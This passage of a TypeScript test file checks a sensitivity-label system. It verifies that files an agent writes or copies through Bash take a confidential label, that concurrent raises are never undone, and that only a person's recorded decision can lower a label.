  assert.deepEqual(keys(grants.mark!.current()), ['org/Confidential'], 'the chat\'s own mark still protects what it holds');
  // Sign Again signs the file keeping only what raises, then writes the kept raises.
  assert.equal(await host.signAgainForRaises(root), true);
  assert.equal(await labelOfPath(host, root, 'out.md'), 'org/Confidential');
  assert.equal(await labelOfPath(host, root, 'out3.md'), 'org/Confidential');
  assert.equal(await labelOfPath(host, root, 'notes.md'), 'org/Internal', 'the hand-edited raise was kept, as Sign Again keeps raises');
});

test('Bash writes the classifier tags (cp, tee) take the mark like Write and Edit', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential') });
  const runtime = await host.runtimeFor({ root, actor: { kind: 'agent', sessionId: 'bash-writes' }, presence: 'person', context: 'interactive' });
  const grants = grantsAt([label('org', 'Public')]);
  await runWith(root, [call('b1', 'Bash', { command: 'cp conf.md copy.md' }), call('b2', 'Bash', { command: 'echo hi | tee out.txt' })], grants, runtime);
  await host.labelsFor(root).flushRaises();
  assert.deepEqual(keys(grants.mark!.current()), ['org/Confidential'], 'the copy read raised the mark first');
  assert.equal(await labelOfPath(host, root, 'copy.md'), 'org/Confidential');
  assert.equal(await labelOfPath(host, root, 'out.txt'), 'org/Confidential');
});

// ---- PR #87 review round 1: a write that claims to raise is worked out inside the writer's lock, against the map it is given ----

test('review 1: a label raised by another writer between the auto-raise\'s read and its write is never set back down', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential') });
  writeFileSync(path.join(root, 'out.md'), 'derived\n');
  // Another window (or Set Label) raises out.md to Restricted right after this host read the labels and before its write.
  const other = new GateHost({ globalStorageDir: (host as unknown as { options: { globalStorageDir: string } }).options.globalStorageDir, secrets: (host as unknown as { options: { secrets: MemorySecrets } }).options.secrets, productVersion: '0.4.30-test', projectRoot: root, home: root });
  assert.equal((await other.start()).state, 'valid');
  const reader = host.labelsFor(root);
  const view = reader.view.bind(reader);
  let raced = false;
  reader.view = async (scales) => {
    const seen = await view(scales);
    if (!raced) { raced = true; await other.changeLabels(root, (map) => setLabelEntry(map, 'out.md', label('org', 'Restricted'))); }
    return seen;
  };
  await host.writeRaises(root, new Map([['out.md', [label('org', 'Confidential')]]]));
  reader.view = view;
  reader.invalidate();
  assert.equal(await labelOfPath(host, root, 'out.md'), 'org/Restricted', 'the higher label stays');
});

test('review 1: a synced copy of the label file raised mid-write keeps its raises', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential'), 'notes.md': label('org', 'Internal') });
  const file = path.join(root, ...LABEL_MAP_FILE.split('/'));
  const other = new GateHost({ globalStorageDir: (host as unknown as { options: { globalStorageDir: string } }).options.globalStorageDir, secrets: (host as unknown as { options: { secrets: MemorySecrets } }).options.secrets, productVersion: '0.4.30-test', projectRoot: root, home: root });
  assert.equal((await other.start()).state, 'valid');
  const reader = host.labelsFor(root);
  const view = reader.view.bind(reader);
  let raced = false;
  reader.view = async (scales) => {
    const seen = await view(scales);
    // The copy that arrives raises notes.md and out.md to Restricted.
    if (!raced) { raced = true; await other.changeLabels(root, (map) => setLabelEntry(setLabelEntry(map, 'notes.md', label('org', 'Restricted')), 'out.md', label('org', 'Restricted'))); }
    return seen;
  };
  await host.writeRaises(root, new Map([['out.md', [label('org', 'Confidential')]], ['notes.md', [label('org', 'Confidential')]]]));
  reader.view = view;
  reader.invalidate();
  assert.ok(existsSync(file));
  assert.equal(await labelOfPath(host, root, 'notes.md'), 'org/Restricted');
  assert.equal(await labelOfPath(host, root, 'out.md'), 'org/Restricted');
});

test('review 1: the writer refuses any write that would lower or drop a label unless a person\'s recorded lowering is named', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential'), 'notes.md': label('org', 'Internal') });
  const file = path.join(root, ...LABEL_MAP_FILE.split('/'));
  const bytes = readFileSync(file, 'utf8');
  await assert.rejects(() => host.changeLabels(root, (map) => setLabelEntry(map, 'conf.md', label('org', 'Public'))), (error: unknown) => error instanceof LabelMapError && error.message === LABEL_LOWERING_REFUSED_TEXT);
  await assert.rejects(() => host.changeLabels(root, (map) => setLabelEntry(map, 'notes.md', undefined)), (error: unknown) => error instanceof LabelMapError && error.message === LABEL_LOWERING_REFUSED_TEXT, 'a dropped entry is a lowering too');
  await assert.rejects(() => host.changeLabels(root, (map) => setLabelEntry(map, 'conf.md', label('ca-protected', 'Protected B'))), (error: unknown) => error instanceof LabelMapError, 'another scale replaces the label, which lowers it on its own scale');
  assert.equal(readFileSync(file, 'utf8'), bytes, 'nothing was written');
  // A raise passes, and a person's recorded lowering through its own path passes.
  await host.changeLabels(root, (map) => setLabelEntry(map, 'notes.md', label('org', 'Confidential')));
  await host.changeLabels(root, (map) => setLabelEntry(map, 'conf.md', label('org', 'Public')), undefined, { lowering: { kind: 'person', reason: 'cleared for release' } });
  assert.equal(await labelOfPath(host, root, 'conf.md'), 'org/Public');
});

test('review 2.2: a written file whose label holds several scales still takes the chat\'s label, on the scale that can rise, the strictest by routing tier', () => {
  const routing = DEFAULT_ROUTING;
  assert.deepEqual(keys([raisedEntryLabel([label('org', 'Internal'), label('ca-protected', 'Protected A')], [label('org', 'Confidential')], SCALE_PRESETS, routing)!]), ['org/Confidential']);
  assert.deepEqual(keys([raisedEntryLabel([label('org', 'Internal'), label('ca-protected', 'Protected A')], [label('org', 'Confidential'), label('ca-protected', 'Protected B')], SCALE_PRESETS, routing)!]), ['ca-protected/Protected B']);
  assert.equal(raisedEntryLabel([label('org', 'Restricted'), label('ca-protected', 'Protected B')], [label('org', 'Internal')], SCALE_PRESETS, routing), undefined, 'nothing rises');
});
